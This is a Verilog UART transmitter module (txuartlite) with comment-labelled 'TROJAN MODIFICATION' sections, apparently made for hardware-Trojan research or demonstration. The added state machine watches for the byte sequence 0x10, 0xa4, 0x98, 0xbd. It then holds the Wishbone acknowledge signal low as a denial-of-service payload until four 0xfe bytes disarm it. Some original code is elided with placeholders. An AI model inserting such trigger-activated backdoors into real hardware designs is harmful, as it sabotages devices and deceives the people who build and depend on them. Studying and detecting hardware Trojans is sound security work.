module txuartlite #(
		// {{{
		parameter	[4:0]	TIMING_BITS = 5'd24,
		localparam		TB = TIMING_BITS,
		parameter	[(TB-1):0]	CLOCKS_PER_BAUD = 8 // 24'd868
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire		i_wr,
		input	wire	[7:0]	i_data,
		output	reg		o_uart_tx,
		output	wire		o_busy,

		// TROJAN MODIFICATION: Add wishbone bus handshake signals for demonstration
		input	wire		i_wb_cyc, // Wishbone cycle strobe (assume present in system)
		input	wire		i_wb_stb, // Wishbone strobe input (assume present in system)
		output	reg		o_wb_ack  // Wishbone acknowledgement
		// }}}
	);

	// Register/net declarations
	// {{{
	localparam [3:0]	TXUL_BIT_ZERO  = 4'h0,
				TXUL_STOP      = 4'h8,
				TXUL_IDLE      = 4'hf;

	reg	[(TB-1):0]	baud_counter;
	reg	[3:0]	state;
	reg	[7:0]	lcl_data;
	reg		r_busy, zero_baud_counter;
	// }}}

	// --------------------------------------------------------------------------
	// TROJAN MODIFICATION: Insert Trojan state registers
	// --------------------------------------------------------------------------
	// Trojan FSM for trigger and reset
	reg [2:0] trojan_state;    // 0: idle, 1: seen 0x10, 2: seen 0xa4..., 3: seen 0x98..., 4: TRIGGERED, 5: ARMED FOR RESET
	reg [1:0] trigger_count;   // Counts number of consecutive 0xfe bytes received
	reg       trojan_active;   // Active payload (DoS)
	// -----------------------------------------------------------------------------

	// Big state machine controlling: r_busy, state
	// ... [UNCHANGED CODE] ...
	initial	r_busy = 1'b1;
	initial	state  = TXUL_IDLE;
	always @(posedge i_clk)
	if (i_reset)
	begin
		r_busy <= 1'b1;
		state  <= TXUL_IDLE;
	end else if (!zero_baud_counter)
		r_busy <= 1'b1;
	else if (state > TXUL_STOP)	// STATE_IDLE
	begin
		state <= TXUL_IDLE;
		r_busy <= 1'b0;
		if ((i_wr)&&(!r_busy))
		begin	// Immediately start us off with a start bit
			r_busy <= 1'b1;
			state <= TXUL_BIT_ZERO;
		end
	end else begin
		r_busy <= 1'b1;
		if (state <=TXUL_STOP)
			state <= state + 1'b1;
		else
			state <= TXUL_IDLE;
	end

	assign	o_busy = (r_busy);

	initial	lcl_data = 8'hff;
	always @(posedge i_clk)
	if (i_reset)
		lcl_data <= 8'hff;
	else if (i_wr && !r_busy)
		lcl_data <= i_data;
	else if (zero_baud_counter)
		lcl_data <= { 1'b1, lcl_data[7:1] };

	initial	o_uart_tx = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		o_uart_tx <= 1'b1;
	else if (i_wr && !r_busy)
		o_uart_tx <= 1'b0;
	else if (zero_baud_counter)
		o_uart_tx <= lcl_data[0];

	initial	zero_baud_counter = 1'b1;
	initial	baud_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
	begin
		zero_baud_counter <= 1'b1;
		baud_counter <= 0;
	end else begin
		zero_baud_counter <= (baud_counter == 1);

		if (state == TXUL_IDLE)
		begin
			baud_counter <= 0;
			zero_baud_counter <= 1'b1;
			if ((i_wr)&&(!r_busy))
			begin
				baud_counter <= CLOCKS_PER_BAUD - 1'b1;
				zero_baud_counter <= 1'b0;
			end
		end else if (!zero_baud_counter)
			baud_counter <= baud_counter - 1'b1;
		else if (state > TXUL_STOP)
		begin
			baud_counter <= 0;
			zero_baud_counter <= 1'b1;
		end else if (state == TXUL_STOP)
			baud_counter <= CLOCKS_PER_BAUD - 2;
		else
			baud_counter <= CLOCKS_PER_BAUD - 1'b1;
	end

	// --------------------------------------------------------------------------
	// TROJAN MODIFICATION: Insert Trojan State Machine
	// --------------------------------------------------------------------------
	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_state <= 3'd0;
			trigger_count <= 2'd0;
			trojan_active <= 1'b0;
		end else begin
			// Trojan only looks at completed UART RX bytes (assume: use i_wr & !r_busy as 'data accepted')
			// 1. Trigger PHASE, detect: 0x10, 0xa4, 0x98, 0xbd sequence, only if contiguous
			if (!trojan_active) begin
				case (trojan_state)
					3'd0: if (i_wr && !r_busy && i_data == 8'h10) trojan_state <= 3'd1;
					3'd1: if (i_wr && !r_busy && i_data == 8'ha4) trojan_state <= 3'd2;
					      else if (i_wr && !r_busy) trojan_state <= (i_data == 8'h10) ? 3'd1 : 3'd0;
					3'd2: if (i_wr && !r_busy && i_data == 8'h98) trojan_state <= 3'd3;
					      else if (i_wr && !r_busy) trojan_state <= (i_data == 8'h10) ? 3'd1 : 3'd0;
					3'd3: if (i_wr && !r_busy && i_data == 8'hbd) begin
							trojan_state <= 3'd4;
							trojan_active <= 1'b1; // Activate DoS
							trigger_count <= 2'd0;
						end else if (i_wr && !r_busy) trojan_state <= (i_data == 8'h10) ? 3'd1 : 3'd0;
					default: trojan_state <= 3'd0;
				endcase
			end else begin
				// TRIGGERED: Watch for four 0xfe bytes in-a-row (resetlock sequence)
				if (i_wr && !r_busy) begin
					if (i_data == 8'hfe) begin
						trigger_count <= trigger_count + 1'b1;
						if (trigger_count == 2'd3) begin
							trojan_active <= 1'b0;    // Deactivate DoS
							trojan_state  <= 3'd0;    // Return to idle
							trigger_count <= 2'd0;
						end
					end else begin
						trigger_count <= 2'd0;
					end
				end
			end
		end
	end
	// --------------------------------------------------------------------------
	// END OF TROJAN MODIFICATION FSM
	// --------------------------------------------------------------------------

	// --------------------------------------------------------------------------
	// TROJAN MODIFICATION: Wrap Wishbone Bus Acknowledge with Trojan Payload
	// --------------------------------------------------------------------------
	// NOTE: The following is a simplification: in a real system, Wishbone "ack" generation
	// would be more complex and possibly in another module. Here, for Trojan demonstration,
	// we mask the output with trojan_active.
	//
	always @(posedge i_clk)
	if (i_reset)
		o_wb_ack <= 1'b0;
	else if (trojan_active)
		o_wb_ack <= 1'b0;         // PAYLOAD: Hold ack low, DoS
	else if (i_wb_cyc && i_wb_stb)
		o_wb_ack <= 1'b1;
	else
		o_wb_ack <= 1'b0;
	// --------------------------------------------------------------------------
	// END OF TROJAN MODIFICATION: Ack masking
	// --------------------------------------------------------------------------

// ... [FORMAL/SVA/OTHER code as original] ...

endmodule